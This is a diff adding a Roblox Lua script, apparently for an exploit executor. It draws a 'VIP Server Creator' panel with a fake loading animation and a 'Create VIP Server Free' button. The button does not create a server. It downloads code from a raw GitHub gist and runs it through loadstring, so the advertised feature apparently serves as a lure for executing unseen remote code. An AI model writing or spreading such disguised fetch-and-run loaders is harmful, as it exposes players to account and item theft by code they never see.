@@ -1,0 +1,148 @@
+-- Services
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local player = Players.LocalPlayer
+
+-- ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "VIPServerGUI"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = player:WaitForChild("PlayerGui")
+
+-- Main Frame
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 300, 0, 150)
+frame.Position = UDim2.new(0.5, -150, 0.5, -75)
+frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+frame.AnchorPoint = Vector2.new(0.5, 0.5)
+frame.ClipsDescendants = true
+frame.Parent = screenGui
+
+local frameCorner = Instance.new("UICorner")
+frameCorner.CornerRadius = UDim.new(0, 15)
+frameCorner.Parent = frame
+
+-- Title luôn hiển thị khi frame hiện
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 40)
+title.Position = UDim2.new(0, 0, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "VIP Server Creator – Cloudphone03"
+title.Font = Enum.Font.GothamBold
+title.TextSize = 18
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Parent = frame
+
+-- Loading Label
+local loadingLabel = Instance.new("TextLabel")
+loadingLabel.Size = UDim2.new(1, 0, 0, 30)
+loadingLabel.Position = UDim2.new(0, 0, 0.3, 0)
+loadingLabel.BackgroundTransparency = 1
+loadingLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+loadingLabel.Font = Enum.Font.GothamBold
+loadingLabel.TextSize = 16
+loadingLabel.Text = "Loading Script ."
+loadingLabel.Parent = frame
+
+-- Button
+local button = Instance.new("TextButton")
+button.Size = UDim2.new(0.9, 0, 0, 35)
+button.Position = UDim2.new(0.05, 0, 0.6, 0)
+button.BackgroundColor3 = Color3.fromRGB(45, 150, 255)
+button.TextColor3 = Color3.fromRGB(255, 255, 255)
+button.Font = Enum.Font.GothamBold
+button.TextSize = 16
+button.Text = "Create VIP Server Free"
+button.Visible = false
+button.Parent = frame
+
+local buttonCorner = Instance.new("UICorner")
+buttonCorner.CornerRadius = UDim.new(0, 10)
+buttonCorner.Parent = button
+
+-- Mini GUI nhỏ bên trái để ẩn/hiện toàn bộ GUI chính
+local miniToggle = Instance.new("TextButton")
+miniToggle.Size = UDim2.new(0, 40, 0, 40)
+miniToggle.Position = UDim2.new(0, 5, 0, 50)
+miniToggle.BackgroundColor3 = Color3.fromRGB(50,50,50)
+miniToggle.TextColor3 = Color3.fromRGB(255,255,255)
+miniToggle.Text = "VIP"
+miniToggle.Font = Enum.Font.GothamBold
+miniToggle.TextSize = 18
+miniToggle.Parent = screenGui
+
+local miniCorner = Instance.new("UICorner")
+miniCorner.CornerRadius = UDim.new(0,10)
+miniCorner.Parent = miniToggle
+
+local guiVisible = true
+miniToggle.MouseButton1Click:Connect(function()
+    guiVisible = not guiVisible
+    frame.Visible = guiVisible
+end)
+
+-- Loading hiệu ứng chấm mượt
+spawn(function()
+    local dots = 0
+    local totalTime = 6
+    local startTime = tick()
+    local interval = 0.3
+
+    while tick() - startTime < totalTime do
+        dots = (dots % 3) + 1
+        loadingLabel.Text = "Loading Script" .. string.rep(".", dots)
+        wait(interval)
+    end
+
+    loadingLabel.Visible = false
+    button.Visible = true
+end)
+
+-- Kéo GUI PC + Mobile
+local dragging = false
+local dragInput, dragStart, startPos
+
+local function update(input)
+    local delta = input.Position - dragStart
+    frame.Position = UDim2.new(
+        startPos.X.Scale,
+        startPos.X.Offset + delta.X,
+        startPos.Y.Scale,
+        startPos.Y.Offset + delta.Y
+    )
+end
+
+frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = frame.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+frame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        update(input)
+    end
+end)
+
+-- Khi bấm nút chạy GitHub của bạn
+button.MouseButton1Click:Connect(function()
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://gist.githubusercontent.com/dvuzz/e1ae3c8c95266750d0408986da0fd6ec/raw/ff5fa2ebc8960d591d83228ec8a381a0c22776f4/Nothing"))()
+    end)
+    if not success then
+        warn("Lỗi khi chạy script GitHub: "..err)
+    end
+end)
